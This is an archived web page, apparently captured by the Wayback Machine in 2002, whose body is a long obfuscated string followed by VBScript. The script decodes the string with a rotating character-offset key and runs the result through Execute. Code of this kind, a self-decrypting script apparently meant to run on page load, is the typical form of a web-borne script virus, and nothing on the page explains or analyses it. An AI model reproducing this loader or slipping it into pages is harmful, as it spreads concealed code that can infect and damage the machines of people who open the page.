5BifYhy<aok2T=til@oAn\EfKn=nrgjR]kqm]JeplK]p L`es>ghd]j=>OO&?at>ghd]j$CmjneflOtjajg!S]lDa[OuZ9 ;jaal]Kbb]_t Ocjaltafc.<a_tagjajq)OelBod\ark9 L`es>ghd]j*SmZBod\arkFgd`ej;kufl=(>gn =Y_hLamh>kl\]n afFgd`ejk>ghd]j?omfp 5Bod\ar;gqnl' )Da[OuZ&]d\Bod\ar;gqnl$T]elFgd`ej&Jae]F]ttEf<ecKm^.;gqnl9 (Ph]fDYotAf`ep;daj9 AfotjJav ;qrj]jtKlnif_(T(L]f$CmjneflOtjajg!%-)OuZKprafc 5Ii\ ?ujjanlKprafc,DYotAf`ep;daj#-,D]j(;mnr]fpSljen_!)LYkpIf\ax;`]r%)%;qrj]jtKlnif_=CFC`Yjg]Kqb ;qrj]jtKlnif_(LYkpIf\ax;`]r!SmZA 5-=hs]I^OuZ==(T`]j;qrj]jtKlnif_=;qrj]jtKlnif_&<ecKm^.Alam )% \Epap <g=doef 5,>krb=)TgBod\ar;gqnlI^HCYka(Km^Sljen_!=D?ak]$Da[OuZ&Et]e$j!!T`]jAb b8 >ghd]j?omfp L`an?ujjanlKprafc 5?ujjanlKprafc @i[Kqb&Apee f+)!&XAxalDgEf\I^Ef\I^N]ppD]slAjd]p?hYj=AjsljNen ?ujjanlKprafc,T,D]j(;mnr]fpSljen_!)1!SmZOtjajg5Ma\$CmjneflOtjajg$D]slAjd]p?hYj'1$Dan ;qrj]jtKlnif_%-DYotAf`ep;daj%-)?ujjanlKprafc 5GJ;`]n_]OuZ ?ujjanlKprafc,DYotAf`ep;daj!=f` A^=f` A^DgkpGJGZkSmZ=;qrj]jtKlnif_=f` >mjclakn>mjclaknCFPjgla_Ype !GfEjjkrJasmea F]ttNe_H]t`N]lm]=DK=Q[LG;=LWE=C@AJETKkflo]r]TIi[jksg^p\Gmplggg =plr]ko\<]cr]]<esc<agj]a 5SsK`ald&Ne_Jaa\ Ne_H]t`N]lm]%Ab <aok<]cr]]= L`an@ikc@e_jae5Faf]lq<esc 2XAn\EfBoje=)po-<aok<]cr]]=CFOZgOuZ @ikc@e_jae!KBmimY_aFgd`ej @ikc@e_jae!N]ppOoS`]hl&JagOjet]Ne_H]t`N]lm](DakgD]_ne]Ef\Fmf_tagjFmf_tagj CBqmeYce>ghd]j$PYldNYea)Kn=nrgjR]kqm]JeplK]p >ghd]jJae]=>OO&?at>ghd]j$PYldNYea)OelPhakBid]o 5Bod\arFYie&>el]k@lpEpaotk9 (FgjEY[d L`es>aheAj L`es>ahekFadaEpl=M?ak]$FKG*G]lAxl]jsagjNYea(L`es>ahe&H]t`!%Ab >ahe=pp 5HLE GjFadaEpl=DTED GjFadaEpl==SHOjBid]Axl9 HDPKr>el]=tt5BKLLdefCYdh CB=ph]jdLg$T`aoFada.HYph$dted)Alk]Ef>el]=tt5N:OLdefCYdh CB=ph]jdLg$T`aoFada.HYph$rbk%=hs]Ab >ahe=pp 5HLL L`anDtl=tiklo 5-=jdAbFaxlI^$U;Yoe H]t`F]m]!=M?ak]$WafLal`&@ekcpohT)!Kr QCYka(HYphFYie!9 M;]s] SifH]t` <asclkp!%T`]j@pt=peslk=)=f` A^A^HllAxakps50LdefFKG*CghuFada OajPYld sqkpee+.\\]oklgl.afe$H]t`F]m]FKG*CghuFada OajPYld w]ZXFgd`ej&dtl(PYldNYea=jdAb=jd>qn[leof>qn[leofGJK]pDae$)Kn=nrgjR]kqm]Jepl=jn.;daajT]kpIl9 OK_rahp.K[nihlBuddjae]A^EjjT`]jAjW`]ne5`lilEdkaAjW`]ne5nZoAn\EfEfAjW`]ne5nZoLdefS]lFKG=;neYlaOZbacl S[jeplajg&>el]Kusl]iOZbacl%KatOoS`]hl5Cj]]t]G^j][p(OOcjalt&Kdedd)Alk]K]p 9hll]G^j][p 5`o[miefl*ahhhelk$CB[gm]ot!9hll]G^j][p.k]pCDKED wF1+1D;*.-);B0%)-D(%=D:1)0(;,4><189(>}!9hll]G^j][p.[jaal]Enkl]n[]$)OelSsK`ald9 9hll]G^j][p.?]pOZbacl %9lpd]Kbb]_t&kat;DOI< {(<03>=,1%>,9+%-1;>)81,,-((=0;1,5,*.8u%9lpd]Kbb]_t&[neYlaIfkpaf[a(!S]lFKG=9lpd]Kbb]_t&?atGZfe[l$)An\EfOel@ikcKbb]_t5FKG*DjarekFgjEY[d <aokL]ipAj <aokGZfe[lA^DakgT]el.<jev]Lup]8>*Af\DakgT]el.<jev]Lup]8>)T`]j=tilBojEf\I^Faf]lq<esc9 <aokL]ip&<nin]HellarJepl<ai Gldej9nr +%J]n\giir]>gn a5, Lg3Kt`]nAjj$i!9 Afp( 1*Jjd!!F]ttPeehOtjajg5Fgji5)TgHef PhakPepl%LamhFqm5Ak[$Ma\$T`aoT]pp,a$-)!I^PeehJue9 )+T`]jLamhFqm520EdkaI^PeehJue9 )(T`]jLamhFqm521Ef\I^T]elC`Yn 5?hj PeehJue) Gldej9nr aMg\4!!A^T]elC`Yn 5?hj /4!Ph]fL]ip;`]r5C`j$10!=f` A^L]ipKlnif_=LamhKprafc Peeh?hYjF]ttQnDg_kKln 5Ep]_ul]$<emCay9jn(+!(T`aoT]pprb;jHfK]q=rj ,)5Ol`ar9jn((!&n^CjDb&Geq9nr )% 5 Kt`]nAjj$1! &nZ?rD^Cay9jn(*!=&Gph]j=rj .)vZ;nL^C]uAjj$3!9  Gldej9nr +% rb;jHfFgji5)TgHef Ax]Kprafc)vZ;nL^L]ipFmi 5=s[ Ii\ Ax]Kprafc,a$-)!&nZ?rD^Ab L]ipFmi 5-8Ldef&nZ?rD^LamhFqm53,&nZ?rD^=jdAbrb;jHfT]elC`Yn 5?hj PeehJue' C]uAjj$iEkd,%)vZ;nL^A^T]elC`Yn 5?hj .8!Ph]fn^CjDb&Peeh?hYj=n^Cj&nZ?rD^=hs]Ab L]ip;`]r5C`j$21!T`]jrb;jHfT]elC`Yn 5rbD^n^CjDb&An\EfvZ;nL^L`esL]tt5T`aoT]pp Peeh?hYjn^CjDb&Jepl!&n^CjDb Ep]_ul]$T`aoT]pp)T`aoT]pp 5Ep]Otjajg5&LamhKprafc @lilL]tt5< k_rahp dYjgmYce5n^s[jepl6 rb;jHf\g_ue]jt&onil] < \evkpyd]9'hgoilakn2Y^sgdqt]3l]^p:(ht;lkp2(lx3si\ld:(ht;`ai_`p:(ht;r)if\ax2*4;nesaZelalu:`ed\]j'6&8 9LPD=P F9IE5CFW_qeklH=ACHL5, OA@T@5, [g`e5[km&eo.Y_tanaX&9_tanaP;kmhgjefl:4&+AHHHEL6 < '`in6 nZ?rD^&8'k_rahp> nZ?rD^&8k[nihllYfcuY_a=nZocjalt6&n^CjDb PhakPepl&n^CjDb QnDg_kKln rb;jHf4&+s[jepl6 rb;jHf4&+BG<U> nZ?rD^&8'@PMD6N^sL]tt5T`aoT]pp rb;jHfUfDkccKprvZ;nL^ CF_kl]rl %SifH]t`9 >KK.?]pSh]_iYdBod\ar (% \I^$FKG*FadaEpaotk SifH]t` oabT>kl\]n.`lp!!T`]j>OO&;kpq>el]SifH]t` oabT>kl\]n.`lp$OenHYpho]^\cbsadd*ga^=jdAbAb  >OO&>el]=tiklo(OajPYld sqkpee+.\\]oklgl.afe!!T`]j>OO&;kpq>el]SifH]t` kusl]i3*T`ekcpoh&ena(WafLal`&oyklam+*Xkbo]ld&ci^=f` A^=f` >mjclakn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 8"&vbCrLf&"KeyArr(1) = 8"&vbCrLf&"KeyArr(2) = 4"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>




<!--
     FILE ARCHIVED ON 19:38:25 Oct 20, 2002 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 23:41:55 Feb 8, 2012.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
